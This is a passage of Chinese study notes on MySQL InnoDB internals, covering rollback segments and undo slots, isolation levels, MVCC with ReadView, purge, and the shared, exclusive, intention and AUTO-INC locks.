也就是0xFFFFFFFF，但是我们之后会看到，0xFFFFFFFF这个数有特 殊用途，所以实际上TRX_RSEG_MAX_SIZE的值为0xFFFFFFFE。</p><p>TRX_RSEG_HISTORY_SIZE：History链表占用的页面数量。</p><p>TRX_RSEG_HISTORY：History链表的基节点。</p><p>TRX_RSEG_FSEG_HEADER ： 本 Rollback Segment 对 应 的 10 字 节 大 小 的 Segment Header结构，通过它可以找到本段对应的INODE Entry。</p><p>TRX_RSEG_UNDO_SLOTS：各个Undo页面链表的first undo page的页号集 合，也就是undo slot集合。</p><p>一 个 页 号 占 用 4 个 字 节 ， 对 于 16KB 大 小 的 页 面 来 说 ， 这 个 TRX_RSEG_UNDO_SLOTS部分共存储了1024个undo slot，所以共需1024 × 4 = 4096个字节。</p><p><strong>从回滚段中申请Undo页面链表</strong></p><p>如果是FIL_NULL，那么在表空间中新创建一个段（也就是Undo Log Segment），然后从段里申请一个页面作为Undo页面链表的first undo page，然后把该undo slot的值设置为刚刚申请的这个页面的地址，这样 也就意味着这个undo slot被分配给了这个事务。</p><p>如果不是FIL_NULL，说明该undo slot已经指向了一个undo链表，也就是 说这个undo slot已经被别的事务占用了，那就跳到下一个undo slot， 判断该undo slot的值是不是FIL_NULL，重复上边的步骤。</p><p>这1024个undo slot都已经 名花有主（被分配给了某个事务），此时由于新事务无法再获得新的Undo 页面链表，就会回滚这个事务并且给用户报错： Too many active concurrent transactions</p><p>用户看到这个错误，可以选择重新执行这个事务（可能重新执行时有别的 事务提交了，该事务就可以被分配Undo页面链表了）。</p><p><strong>如果该undo slot指向的Undo页面链表符合被重用的条件（就是我们上边 说的Undo页面链表只占用一个页面并且已使用空间小于整个页面的 3/4）。</strong></p><p>该undo slot就处于被缓存的状态，设计InnoDB的大叔规定这时该Undo页 面链表的TRX_UNDO_STATE属性（该属性在first undo page的Undo Log Segment Header部分）会被设置为TRX_UNDO_CACHED。</p><p>被缓存的undo slot都会被加入到一个链表，根据对应的Undo页面链表的 类型不同，也会被加入到不同的链表： 如果对应的Undo页面链表是insert undo链表，则该undo slot会被加 入insert undo cached链表。 如果对应的Undo页面链表是update undo链表，则该undo slot会被加 入update undo cached链表。 一个回滚段就对应着上述两个cached链表，如果有新事务要分配undo slot时，先从对应的cached链表中找。如果没有被缓存的undo slot，才 会到回滚段的Rollback Segment Header页面中再去找。</p><p>如果该undo slot指向的Undo页面链表不符合被重用的条件，那么针对该 undo slot对应的Undo页面链表类型不同，也会有不同的处理： 如果对应的Undo页面链表是insert undo链表，则该Undo页面链表的 TRX_UNDO_STATE属性会被设置为TRX_UNDO_TO_FREE，之后该Undo页面 链表对应的段会被释放掉（也就意味着段中的页面可以被挪作他 用），然后把该undo slot的值设置为FIL_NULL。 如果对应的Undo页面链表是update undo链表，则该Undo页面链表的 TRX_UNDO_STATE属性会被设置为TRX_UNDO_TO_PRUGE，则会将该undo slot的值设置为FIL_NULL，然后将本次事务写入的一组undo日志放到 所谓的History链表中（需要注意的是，这里并不会将Undo页面链表对 应的段给释放掉，因为这些undo日志还有用呢～）。</p><p>1024个undo slot也只 能支持1024个读写事务同时执行，再多了就崩溃了。</p><p>设计InnoDB的大叔一口气定义了128个回滚段，也就相当 于有了128 × 1024 = 131072个undo slot。</p><p>只有在事务执行过程中对记录做了某 些改动时才会被升级为读写事务。</p><p><strong>每个回滚段都对应着一个Rollback Segment Header页面，有128个回滚 段，自然就要有128个Rollback Segment Header页面，这些页面的地址总 得找个地方存一下吧！于是设计InnoDB的大叔在系统表空间的第5号页面的 某个区域包含了128个8字节大小的格子：</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205103141.png" alt="image-20211205103139506"></p><p>每个8字节的各自的构造就像这样</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205103152.png" alt="image-20211205103150711"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205103241.png" alt="image-20211205103240240"></p><p>回滚段的分类 </p><p>我们把这128个回滚段给编一下号，最开始的回滚段称之为第0号回滚段，之 后依次递增，最后一个回滚段就称之为第127号回滚段。</p><p>这128个回滚段可以被分成两大类： 第0号、第33～127号回滚段属于一类。<strong>其中第0号回滚段必须在系统表空间中（就是说第0号回滚段对应的Rollback Segment Header页面必须在系统表空间中）</strong>，第33～127号回滚段既可以在系统表空间中，也可以在 自己配置的undo表空间中，关于怎么配置我们稍后再说。 如果一个事务在执行过程中由于对普通表的记录做了改动需要分配Undo 页面链表时，必须从这一类的段中分配相应的undo slot。 </p><p>第1～32号回滚段属于一类。<strong>这些回滚段必须在临时表空间</strong>（对应着数据 目录中的ibtmp1文件）中。 如果一个事务在执行过程中由于对临时表的记录做了改动需要分配Undo 页面链表时，必须从这一类的段中分配相应的undo slot。</p><p><strong>也就是说如果一个事务在执行过程中既对普通表的记录做了改动，又对临 时表的记录做了改动，那么需要为这个记录分配2个回滚段，再分别到这两 个回滚段中分配对应的undo slot。</strong></p><p>我们向Undo页面写入undo日志本身也是 一个写页面的过程。也就是说我们对Undo页面做的任何改动都会记录相应类型的 redo日志。但是对于临时表来说，因为修改临时表而产生的undo日志只需要 在系统运行过程中有效，如果系统奔溃了，那么在重启时也不需要恢复这 些undo日志所在的页面，所以在写针对临时表的Undo页面时，并不需要记 录相应的redo日志。</p><p><strong>在修改针对普通表的回滚段中的Undo页面时，需要记录对应的redo 日志，而修改针对临时表的回滚段中的Undo页面时，不需要记录对应的 redo日志</strong></p><p>并发执行的 不同事务其实也可以被分配相同的回滚段，只要分配不同的undo slot就可 以了。</p><p>我们前边说系统中一共有128个回滚段，其实这只是默认值，我们可以通过 启动参数innodb_rollback_segments来配置回滚段的数量，可配置的范围 是1~128。但是这个参数并不会影响针对临时表的回滚段数量，针对临时表 的回滚段数量一直是32，也就是说：</p><p>如果我们把innodb_rollback_segments的值设置为1，那么只会有1个针 对普通表的可用回滚段，但是仍然有32个针对临时表的可用回滚段。 </p><p>如果我们把innodb_rollback_segments的值设置为2～33之间的数， 效果和将其设置为1是一样的。 </p><p>如果我们把innodb_rollback_segments设置为大于33的数，那么针对普 通表的可用回滚段数量就是该值减去32。</p><p>配置undo表空间 </p><p>默认情况下，针对普通表设立的回滚段（第0号以及第33<del>127号回滚段）都 是被分配到系统表空间的。其中的第第0号回滚段是一直在系统表空间的， 但是第33</del>127号回滚段可以通过配置放到自定义的undo表空间中。但是这种 配置只能在系统初始化（创建数据目录时）的时候使用，一旦初始化完 成，之后就不能再次更改了。</p><p>我们看一下相关启动参数： 通过innodb_undo_directory指定undo表空间所在的目录，如果没有指定 该参数，则默认undo表空间所在的目录就是数据目录。 通过innodb_undo_tablespaces定义undo表空间的数量。该参数的默认值 为0，表明不创建任何undo表空间。 </p><p>第33~127号回滚段可以平均分布到不同的undo表空间中。 </p><p>小贴士： 如果我们在系统初始化的时候指定了创建了undo表空间，那 么系统表空间中的第0号回滚段将处于不可用状态。 比 如 我 们 在 系 统 初 始 化 时 指 定 的 innodb_rollback_segments 为 35 ， innodb_undo_tablespaces为2，这样就会将第33、34号回滚段分别分布到 一个undo表空间中。 </p><p>设立undo表空间的一个好处就是在undo表空间中的文件大到一定程度时，可 以自动的将该undo表空间截断（truncate）成一个小文件。而系统表空间的 大小只能不断的增大，却不能截断</p><h1 id="一条记录的多幅面孔-——-事务的隔离级别与MVCC"><a href="#一条记录的多幅面孔-——-事务的隔离级别与MVCC" class="headerlink" title="一条记录的多幅面孔 —— 事务的隔离级别与MVCC"></a>一条记录的多幅面孔 —— 事务的隔离级别与MVCC</h1><p>Oracle就只支持READ COMMITTED和SERIALIZABLE隔离级别。本书中所讨论 的MySQL虽然支持4种隔离级别，但与SQL标准中所规定的各级隔离级别允许 发生的问题却有些出入，MySQL在REPEATABLE READ隔离级别下，是可 以禁止幻读问题的发生的</p><p>MySQL的默认隔离级别为REPEATABLE READ，我们可以手动修改一下事务的 隔离级别</p><p>SET [GLOBAL|SESSION] TRANSACTION ISOLATION LEVEL level;</p><p><strong>SET GLOBAL TRANSACTION ISOLATION LEVEL SERIALIZABLE;</strong></p><p>只对执行完该语句之后产生的会话起作用。 当前已经存在的会话无效。</p><p><strong>SET SESSION TRANSACTION ISOLATION LEVEL SERIALIZABLE;</strong></p><p>对当前会话的所有后续的事务有效 ；该语句可以在已经开启的事务中间执行，但不会影响当前正在执行的 事务。 如果在事务之间执行，则对后续的事务有效。</p><p><strong>SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;</strong></p><p>只对当前会话中下一个即将开启的事务有效。 下一个事务执行完后，后续事务将恢复到之前的隔离级别。 该语句不能在已经开启的事务中间执行，会报错的。</p><p>如果我们在服务器启动时想改变事务的默认隔离级别，可以修改启动参数 transaction-isolation 的 值 ， 比 方 说 我 们 在 启 动 服 务 器 时 指 定 了 – transaction-isolation=SERIALIZABLE，那么事务的默认隔离级别就从原来 的REPEATABLE READ变成了SERIALIZABLE。</p><p><strong>MVCC原理 版本链</strong></p><p>trx_id：每次一个事务对某条聚簇索引记录进行改动时，都会把该事务 的事务id赋值给trx_id隐藏列。 roll_pointer：每次对某条聚簇索引记录进行改动时，都会把旧的版本 写入到undo日志中，然后这个隐藏列就相当于一个指针，可以通过它来 找到该记录修改前的信息。</p><p>实际上insert undo只在事务回滚时起作用，当事务提交后， 该类型的undo日志就没用了，它占用的Undo Log Segment也会被系统 回收（也就是该undo日志占用的Undo页面链表要么被重用，要么被释 放）。虽然真正的insert undo日志占用的存储空间被释放了，但是 roll_pointer的值并不会被清除，roll_pointer属性占用7个字节，第一个 比特位就标记着它指向的undo日志的类型，如果该比特位的值为1时， 就代表着它指向的undo日志类型为insert undo。所以我们之后在画图时 都会把insert undo给去掉，大家留意一下就好了。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205110226.png" alt="image-20211205110224972"></p><p>每次对记录进行改动，都会记录一条undo日志，每条undo日志也都有一个 roll_pointer属性（INSERT操作对应的undo日志没有该属性，因为该记录 并没有更早的版本），可以将这些undo日志都连起来，串成一个链表，所 以现在的情况就像下图一样：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205110342.png" alt="image-20211205110341139"></p><p>我们把这个链表称之为版本链，版本链的头节点就是当 前记录最新的值</p><p>另外，每个版本中还包含生成该版本时对应的事务id</p><p><strong>ReadView</strong></p><p>对于使用READ UNCOMMITTED隔离级别的事务来说，由于可以读到未提交事 务修改过的记录，所以直接读取记录的最新版本就好了；对于使用 SERIALIZABLE隔离级别的事务来说，设计InnoDB的大叔规定使用加锁的方 式 来 访 问 记 录</p><p><strong>对 于 使 用 READ COMMITTED和REPEATABLE READ隔离级别的事务来说，都必须保证读到已经 提交了的事务修改过的记录，也就是说假如另一个事务已经修改了记录但 是尚未提交，是不能直接读取最新版本的记录的，核心问题就是：需要判 断一下版本链中的哪个版本是当前事务可见的。为此，设计InnoDB的大叔 提出了一个ReadView的概念，这个ReadView中主要包含4个比较重要的内 容：</strong></p><p>m_ids：表示在生成ReadView时当前系统中活跃的读写事务的事务id列 表。 </p><p>min_trx_id：表示在生成ReadView时当前系统中活跃的读写事务中最小 的事务id，也就是m_ids中的最小值。 </p><p>max_trx_id：表示生成ReadView时系统中应该分配给下一个事务的id 值。 </p><p>小贴士： 注意max_trx_id并不是m_ids中的最大值，事务id是递增分配 的。比方说现在有id为1，2，3这三个事务，之后id为3的事务提交 了。那么一个新的读事务在生成ReadView时，m_ids就包括1和2， min_trx_id的值就是1，max_trx_id的值就是4。</p><p>creator_trx_id：表示生成该ReadView的事务的事务id。 小贴士： 我们前边说过，只有在对表中的记录做改动时（执行 INSERT、DELETE、UPDATE这些语句时）才会为事务分配事务id， 否则在一个只读事务中的事务id值都默认为0。</p><p><strong>如果被访问版本的trx_id属性值与ReadView中的creator_trx_id值相 同，意味着当前事务在访问它自己修改过的记录，所以该版本可以被当 前事务访问。 如果被访问版本的trx_id属性值小于ReadView中的min_trx_id值，表明 生成该版本的事务在当前事务生成ReadView前已经提交，所以该版本可 以被当前事务访问。 如果被访问版本的trx_id属性值大于ReadView中的max_trx_id值，表明 生成该版本的事务在当前事务生成ReadView后才开启，所以该版本不可 以被当前事务访问。 如果被访问版本的trx_id属性值在ReadView的min_trx_id和max_trx_id 之间，那就需要判断一下trx_id属性值是不是在m_ids列表中，如果在， 说明创建ReadView时生成该版本的事务还是活跃的，该版本不可以被访 问；如果不在，说明创建ReadView时生成该版本的事务已经被提交，该 版本可以被访问。</strong></p><p>在MySQL中，READ COMMITTED和REPEATABLE READ隔离级别的的一个非常大 的区别就是它们生成ReadView的时机不同。</p><p><strong>READ COMMITTED —— 每次读取数据前都生成一个ReadView</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205111522.png" alt="image-20211205111520076"></p><p>假设现在有一个使用READ COMMITTED隔离级别的事务开始执行：</p><p>这个SELECT的执行过程如下： 在执行SELECT语句时会先生成一个ReadView，ReadView的m_ids列表的内 容 就 是 [100, 200] ， min_trx_id 为 100 ， max_trx_id 为 201 ， creator_trx_id为0。 然后从版本链中挑选可见的记录，从图中可以看出，最新版本的列name 的内容是’张飞’，该版本的trx_id值为100，在m_ids列表内，所以不符 合可见性要求，根据roll_pointer跳到下一个版本。 下一个版本的列name的内容是’关羽’，该版本的trx_id值也为100，也在 m_ids列表内，所以也不符合要求，继续跳到下一个版本。 下一个版本的列name的内容是’刘备’，该版本的trx_id值为80，小于 ReadView中的min_trx_id值100，所以这个版本是符合要求的，最后返回 给用户的版本就是这条列name为’刘备’的记录。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205111711.png" alt="image-20211205111709989"></p><p>然后再到刚才使用READ COMMITTED隔离级别的事务中继续查找这个number 为1的记录，如下：</p><p>这个SELECT的执行过程如下： 在执行SELECT语句时会又会单独生成一个ReadView，该ReadView的m_ids 列表的内容就是[200]（事务id为100的那个事务已经提交了，所以再次 生成快照时就没有它了），min_trx_id为200，max_trx_id为201， creator_trx_id为0。 然后从版本链中挑选可见的记录，从图中可以看出，最新版本的列name 的内容是’诸葛亮’，该版本的trx_id值为200，在m_ids列表内，所以不 符合可见性要求，根据roll_pointer跳到下一个版本。 下一个版本的列name的内容是’赵云’，该版本的trx_id值为200，也在 m_ids列表内，所以也不符合要求，继续跳到下一个版本。 下一个版本的列name的内容是’张飞’，该版本的trx_id值为100，小于 ReadView中的min_trx_id值200，所以这个版本是符合要求的，最后返回 给用户的版本就是这条列name为’张飞’的记录。</p><p><strong>REPEATABLE READ —— 在第一次读取数据时生成一个ReadView</strong></p><p>对于使用REPEATABLE READ隔离级别的事务来说，只会在第一次执行查询语 句时生成一个ReadView，之后的查询就不会重复生成了。</p><p>也就是说两次SELECT查询得到的结果是重复的，记录的列c值都是’刘备’， 这就是可重复读的含义。如果我们之后再把事务id为200的记录提交了，然 后再到刚才使用REPEATABLE READ隔离级别的事务中继续查找这个number为 1的记录，得到的结果还是’刘备’，具体执行过程大家可以自己分析一下。</p><p><strong>MVCC小结</strong> </p><p>从上边的描述中我们可以看出来，所谓的MVCC（Multi-Version Concurrency Control ，多版本并发控制）指的就是在使用READ COMMITTD、REPEATABLE READ这两种隔离级别的事务在执行普通的SEELCT操作时访问记录的版本链 的过程，这样子可以使不同事务的读-写、写-读操作并发执行，从而提升系 统性能。READ COMMITTD、REPEATABLE READ这两个隔离级别的一个很大不 同就是：生成ReadView的时机不同，READ COMMITTD在每一次进行普通 SELECT操作前都会生成一个ReadView，而REPEATABLE READ只在第一 次进行普通SELECT操作前生成一个ReadView，之后的查询操作都重复使 用这个ReadView就好了。 </p><p>小贴士： 我们之前说执行DELETE语句或者更新主键的UPDATE语句 并不会立即把对应的记录完全从页面中删除，而是执行一个所谓的 delete mark操作，相当于只是对记录打上了一个删除标志位，这主要 就是为MVCC服务的，大家可以对比上边举的例子自己试想一下怎么 使用。 另外，所谓的MVCC只是在我们进行普通的SEELCT查询时才 生效，截止到目前我们所见的所有SELECT语句都算是普通的查询， 至于啥是个不普通的查询，我们稍后再说哈～</p><p><strong>关于purge</strong></p><p>我们说insert undo在事务提交之后就可以被释放掉了，而update undo 由于还需要支持MVCC，不能立即删除掉。 为了支持MVCC，对于delete mark操作来说，仅仅是在记录上打一个删除 标记，并没有真正将它删除掉。 </p><p>随着系统的运行，在确定系统中包含最早产生的那个ReadView的事务不会 再访问某些update undo日志以及被打了删除标记的记录后，有一个后台运 行的purge线程会把它们真正的删除掉。</p><h1 id="工作面试老大难-——-锁"><a href="#工作面试老大难-——-锁" class="headerlink" title="工作面试老大难 —— 锁"></a><strong>工</strong>作面试老大难 —— 锁</h1><p><strong>写-写情况：即并发事务相继对相同的记录做出改动。</strong> </p><p>我们前边说过，在这种情况下会发生脏写的问题，任何一种隔离级别都 不允许这种问题的发生。所以在多个未提交事务相继对一条记录做改动 时，需要让它们排队执行，这个排队的过程其实是通过锁来实现的。这 个所谓的锁其实是一个内存中的结构，在事务执行前本来是没有锁的， 也就是说一开始是没有锁结构和记录进行关联的，如图所示：</p><p>当一个事务想对这条记录做改动时，首先会看看内存中有没有与这条记 录关联的锁结构，当没有的时候就会在内存中生成一个锁结构与之关联。 比方说事务T1要对这条记录做改动，就需要生成一个锁结构与之关联：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205112607.png" alt="image-20211205112606609"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205112758.png" alt="image-20211205112756978"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205112812.png" alt="image-20211205112811398"></p><p>不加锁 意思就是不需要在内存中生成对应的锁结构，可以直接执行操作。 </p><p>获取锁成功，或者加锁成功 意思就是在内存中生成了对应的锁结构，而且锁结构的is_waiting属 性为false，也就是事务可以继续执行操作。 </p><p>获取锁失败，或者加锁失败，或者没有获取到锁</p><p><strong>读-写或写-读情况：也就是一个事务进行读取操作，另一个进行改动操 作。 我们前边说过，这种情况下可能发生脏读、不可重复读、幻读的问题。</strong> </p><p>小贴士： 幻读问题的产生是因为某个事务读了一个范围的记录，之后 别的事务在该范围内插入了新记录，该事务再次读取该范围的记录 时，可以读到新插入的记录，所以幻读问题准确的说并不是因为读取 和写入一条相同记录而产生的，这一点要注意一下。</p><p>在REPEATABLE READ隔离级别下，幻读可能发生，脏读和不可重复读不 可以发生。</p><p><strong>不过各个数据库厂商对SQL标准的支持都可能不一样，与SQL标准不同的 一点就是，MySQL在REPEATABLE READ隔离级别实际上就已经解决了幻读 问题。</strong></p><p>怎么解决脏读、不可重复读、幻读这些问题呢？其实有两种可选的解决方 案：</p><p><strong>方案一：读操作利用多版本并发控制（MVCC），写操作进行加锁。</strong></p><p><strong>所谓的MVCC我们在前一章有过详细的描述，就是通过生成一个 ReadView，然后通过ReadView找到符合条件的记录版本（历史版本是 由undo日志构建的），其实就像是在生成ReadView的那个时刻做了一 次时间静止（就像用相机拍了一个快照），查询语句只能读到在生成 ReadView之前已提交事务所做的更改，在生成ReadView之前未提交的 事务或者之后才开启的事务所做的更改是看不到的。而写操作肯定针 对的是最新版本的记录，读记录的历史版本和改动记录的最新版本本 身并不冲突，也就是采用MVCC时，读-写操作并不冲突。</strong></p><p><strong>方案二：读、写操作都采用加锁的方式。</strong></p><p>如果我们的一些业务场景不允许读取记录的旧版本，而是每次都必须 去读取记录的最新版本，比方在银行存款的事务中，你需要先把账户 的余额读出来，然后将其加上本次存款的数额，最后再写到数据库 中。在将账户余额读取出来后，就不想让别的事务再访问该余额，直 到本次存款事务执行完成，其他事务才可以访问账户的余额。这样在 读取记录的时候也就需要对其进行加锁操作，这样也就意味着读操作 和写操作也像写-写操作那样排队执行。</p><p><strong>很明显，采用MVCC方式的话，读-写操作彼此并不冲突，性能更高，采用 加锁方式的话，读-写操作彼此需要排队执行，影响性能。一般情况下我 们当然愿意采用MVCC来解决读-写操作并发执行的问题，但是业务在某些 特殊情况下，要求必须采用加锁的方式执行，那也是没有办法的事。</strong></p><p><strong>读操作</strong></p><p><strong>一致性读（Consistent Reads）</strong></p><p>事务利用MVCC进行的读取操作称之为一致性读，或者一致性无锁读，有的地 方也称之为快照读。所有普通的SELECT语句（plain SELECT）在READ COMMITTED、REPEATABLE READ隔离级别下都算是一致性读</p><p><strong>锁定读（Locking Reads）</strong></p><p>我们前边说过，并发事务的读-读情况并不会引起什么问题，不过对于写写、读-写或写-读这些情况可能会引起一些问题，需要使用MVCC或者加锁的 方式来解决它们。在使用加锁的方式解决问题时，由于既要允许读-读情况 不受影响，又要使写-写、读-写或写-读情况中的操作相互阻塞，所以设计 MySQL的大叔给锁分了个类：</p><p>共享锁，英文名：Shared Locks，简称S锁。在事务要读取一条记录时， 需要先获取该记录的S锁。 </p><p>独占锁，也常称排他锁，英文名：Exclusive Locks，简称X锁。在事务要 改动一条记录时，需要先获取该记录的X锁。</p><p><strong>所以我们说S锁和S锁是兼容的，S锁和X锁是不兼容的，X锁和X锁也是不兼容 的，画个表表示一下就是这样：</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205114232.png" alt="image-20211205114230284"></p><p><strong>我们前边说在采用加锁方式解决脏读、不可重复读、幻读这些问题时，读取 一条记录时需要获取一下该记录的S锁，其实这是不严谨的，有时候想在读 取记录时就获取记录的X锁，来禁止别的事务读写该记录，为此设计MySQL 的大叔提出了两种比较特殊的SELECT语句格式：</strong></p><p><strong>对读取的记录加S锁：</strong> </p><p>SELECT … LOCK IN SHARE MODE;</p><p>也就是在普通的SELECT语句后边加LOCK IN SHARE MODE，如果当前事务执行了该语句，那么它会为读取到的记录加S锁，这样允许别的事务继续获取这些记录的S锁（比方说别的事务也使用SELECT … LOCK IN SHARE MODE语句来读取这些记录），但是不能获取这些记录的X锁（比方说使用 SELECT … FOR UPDATE语句来读取这些记录，或者直接修改这些记 录）。如果别的事务想要获取这些记录的X锁，那么它们会阻塞，直到当 前事务提交之后将这些记录上的S锁释放掉。 </p><p><strong>对读取的记录加X锁：</strong> </p><p>SELECT … FOR UPDATE;</p><p>也就是在普通的SELECT语句后边加FOR UPDATE，如果当前事务执行了该 语句，那么它会为读取到的记录加X锁，这样既不允许别的事务获取这些 记录的S锁（比方说别的事务使用SELECT … LOCK IN SHARE MODE语句 来读取这些记录），也不允许获取这些记录的X锁（比方也说使用SELECT … FOR UPDATE语句来读取这些记录，或者直接修改这些记录）。如果 别的事务想要获取这些记录的S锁或者X锁，那么它们会阻塞，直到当前事务提交之后将这些记录上的X锁释放掉。 </p><p><strong>写操作</strong></p><p>平常所用到的写操作无非是DELETE、UPDATE、INSERT这三种： </p><p>DELETE： 对一条记录做DELETE操作的过程其实是先在B+树中定位到这条记录的位 置，然后获取一下这条记录的X锁，然后再执行delete mark操作。我们 也可以把这个定位待删除记录在B+树中位置的过程看成是一个获取X锁的 锁定读。</p><p>UPDATE： 在对一条记录做UPDATE操作时分为三种情况： 如果未修改该记录的键值并且被更新的列占用的存储空间在修改前后 未发生变化，则先在B+树中定位到这条记录的位置，然后再获取一下 记录的X锁，最后在原记录的位置进行修改操作。其实我们也可以把 这个定位待修改记录在B+树中位置的过程看成是一个获取X锁的锁定读。 </p><p>如果未修改该记录的键值并且至少有一个被更新的列占用的存储空间 在修改前后发生变化，则先在B+树中定位到这条记录的位置，然后获取一下记录的X锁，将该记录彻底删除掉（就是把记录彻底移入垃圾 链表），最后再插入一条新记录。这个定位待修改记录在B+树中位置 的过程看成是一个获取X锁的锁定读，<strong>新插入的记录由INSERT操作提供的隐式锁进行保护</strong>。 </p><p><strong>如果修改了该记录的键值，则相当于在原记录上做DELETE操作之后再来一次INSERT操作，加锁操作就需要按照DELETE和INSERT的规则进行 了。</strong></p><p>INSERT： 一般情况下，新插入一条记录的操作并不加锁，设计InnoDB的大叔通过 一种称之为隐式锁的东东来保护这条新插入的记录在本事务提交前不被 别的事务访问。</p><p>给表加S锁： 如果一个事务给表加了S锁，那么：</p><ul><li>别的事务可以继续获得该表的S锁 </li><li>别的事务可以继续获得该表中的某些记录的S锁 </li><li>别的事务不可以继续获得该表的X锁 </li><li>别的事务不可以继续获得该表中的某些记录的X锁 </li></ul><p>给表加X锁： 如果一个事务给表加了X锁（意味着该事务要独占这个表），那么： </p><ul><li>别的事务不可以继续获得该表的S锁 </li><li>别的事务不可以继续获得该表中的某些记录的S锁 </li><li>别的事务不可以继续获得该表的X锁 </li><li>别的事务不可以继续获得该表中的某些记录的X锁</li></ul><p>我们在对教学楼整体上锁（表锁）时，怎么知道教学楼中有没有教室已经 被上锁（行锁）了呢？依次检查每一间教室门口有没有上锁？那这效率也 太慢了吧！遍历是不可能遍历的，这辈子也不可能遍历的，于是乎设计 InnoDB的大叔们提出了一种称之为意向锁（英文名：Intention Locks）的 东东：</p><p>意向共享锁，英文名：Intention Shared Lock，简称IS锁。当事务准备在某条记录上加S锁时，需要先在表级别加一个IS锁。 </p><p>意向独占锁，英文名：Intention Exclusive Lock，简称IX锁。当事务 准备在某条记录上加X锁时，需要先在表级别加一个IX锁。</p><p>总结一下：IS、IX锁是表级锁，它们的提出仅仅为了在之后加表级别的S锁和X锁时可以快速判断表中的记录是否被上锁，以避免用遍历的方式来查看表中有没有上锁的记录，也就是说其实IS锁和IX锁是兼容的，IX锁和IX 锁是兼容的。我们画个表来看一下表级别的各种锁的兼容性</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205115716.png" alt="image-20211205115715055"></p><p>对于MyISAM、MEMORY、MERGE这些存储引擎来说，它们只支持表级锁，而且 这些引擎并不支持事务，所以使用这些存储引擎的锁一般都是针对当前会 话来说的。比方说在Session 1中对一个表执行SELECT操作，就相当于为这 个表加了一个表级别的S锁，如果在SELECT操作未完成时，Session 2中对 这个表执行UPDATE操作，相当于要获取表的X锁，此操作会被阻塞，直到 Session 1中的SELECT操作完成，释放掉表级别的S锁后，Session 2中对这 个表执行UPDATE操作才能继续获取X锁，然后执行具体的更新语句。</p><p>小贴士： 因为使用MyISAM、MEMORY、MERGE这些存储引擎的表 在同一时刻只允许一个会话对表进行写操作，所以这些存储引擎实际 上最好用在只读，或者大部分都是读操作，或者单用户的情景下。 另 外，在MyISAM存储引擎中有一个称之为Concurrent Inserts的特性，支 持在对MyISAM表读取时同时插入记录，这样可以提升一些插入速 度。</p><p><strong>InnoDB中的表级锁</strong> </p><p><strong>表级别的S锁、X锁</strong> </p><p>在对某个表执行SELECT、INSERT、DELETE、UPDATE语句时，InnoDB存储 引擎是不会为这个表添加表级别的S锁或者X锁的。 另外，在对某个表执行一些诸如ALTER TABLE、DROP TABLE这类的DDL语 句时，其他事务对这个表并发执行诸如SELECT、INSERT、DELETE、 UPDATE的语句会发生阻塞，同理，某个事务中对某个表执行SELECT、 INSERT、DELETE、UPDATE语句时，在其他会话中对这个表执行DDL语句也 会发生阻塞。这个过程其实是通过在server层使用一种称之为元数据锁 （英文名：Metadata Locks，简称MDL）东东来实现的，一般情况下也不 会使用InnoDB存储引擎自己提供的表级别的S锁和X锁。</p><p>小贴士： 在事务简介的章节中我们说过，DDL语句执行时会隐式的提 交当前会话中的事务，这主要是DDL语句的执行一般都会在若干个特 殊事务中完成，在开启这些特殊事务前，需要将当前会话中的事务提交掉。</p><p>在系统变量autocommit=0，innodb_table_locks = 1 时，手动获取InnoDB存储引擎提供的表t的S锁或者X锁可以这么写：</p><p><strong>LOCK TABLES t READ：InnoDB存储引擎会对表t加表级别的S锁</strong> </p><p><strong>LOCK TABLES t WRITE：InnoDB存储引擎会对表t加表级别的X锁</strong></p><p>不过请尽量避免在使用InnoDB存储引擎的表上使用LOCK TABLES这样的手 动锁表语句，它们并不会提供什么额外的保护，只是会降低并发能力而 已。InnoDB的厉害之处还是实现了更细粒度的行锁，关于表级别的S锁和 X锁大家了解一下就罢了。</p><p><strong>表级别的IS锁、IX锁</strong> </p><p>当我们在对使用InnoDB存储引擎的表的某些记录加S锁之前，那就需要先 在表级别加一个IS锁，当我们在对使用InnoDB存储引擎的表的某些记录 加X锁之前，那就需要先在表级别加一个IX锁。IS锁和IX锁的使命只是为 了后续在加表级别的S锁和X锁时判断表中是否有已经被加锁的记录，以 避免用遍历的方式来查看表中有没有上锁的记录。更多关于IS锁和IX锁 的解释我们上边都唠叨过了，就不赘述了。 </p><p><strong>表级别的AUTO-INC锁</strong> </p><p>在使用MySQL过程中，我们可以为表的某个列添加AUTO_INCREMENT属性， 之后在插入记录时，可以不指定该列的值，系统会自动为它赋上递增的值，比方说我们有一个表：</p><p><strong>系统实现这种自动给AUTO_INCREMENT修饰的列递增赋值的原理主要是两 个：</strong></p><p><strong>采用AUTO-INC锁，也就是在执行插入语句时就在表级别加一个AUTO_INC锁，然后为每条待插入记录的AUTO_INCREMENT修饰的列分配递增的值，在该语句执行结束后，再把AUTO-INC锁释放掉。这样一个事务在持有AUTO-INC锁的过程中，其他事务的插入语句都要被阻塞，可以保证一个语句中分配的递增值是连续的。</strong></p><p>采用AUTO-INC锁，也就是在执行插入语句时就在表级别加一个AUTOINC锁，然后为每条待插入记录的AUTO_INCREMENT修饰的列分配递增 的值，在该语句执行结束后，再把AUTO-INC锁释放掉。这样一个事务 在持有AUTO-INC锁的过程中，其他事务的插入语句都要被阻塞，可以 保证一个语句中分配的递增值是连续的。 如果我们的插入语句在执行前不可以确定具体要插入多少条记录（无 法预计即将插入记录的数量），比方说使用INSERT … SELECT、 REPLACE … SELECT或者LOAD DATA这种插入语句，一般是使用AUTOINC锁为AUTO_INCREMENT修饰的列生成对应的值。 </p><p>小贴士： 需要注意一下的是，这个AUTO-INC锁的作用范围只是单 个插入语句，插入语句执行完成后，这个锁就被释放了，跟我们之 